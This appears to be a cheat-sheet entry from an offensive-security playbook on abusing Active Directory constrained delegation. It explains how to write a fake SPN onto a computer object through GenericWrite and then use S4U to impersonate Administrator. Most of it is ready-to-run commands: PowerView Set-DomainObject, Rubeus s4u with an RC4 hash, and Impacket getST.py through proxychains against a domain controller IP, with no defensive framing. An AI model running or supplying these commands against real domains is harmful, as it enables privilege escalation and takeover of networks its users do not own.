# 11.01 Constrained Delegation via SPN Write

> Write a fake SPN on a computer via GenericWrite to enable constrained delegation, then S4U2Self+Proxy to impersonate any user to that service.

## Overview

If you have GenericWrite on a computer object, set a fake SPN to enable constrained delegation, then use S4U2Self+Proxy to impersonate any user to that service.

## Steps

- **Set-DomainObject -Set serviceprincipalname** — add SPN to enable delegation.
- **Rubeus s4u /msdsspn** — impersonate Administrator.

## Commands

### SPN write + S4U Windows

```powershell
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dhcp/DATABASE01'} -Verbose
.\Rubeus.exe s4u /domain:<DOMAIN>.local /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap
```

### SPN write + getST Linux

```bash
proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '<DOMAIN>.local/SRV01$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip 172.16.92.10
```
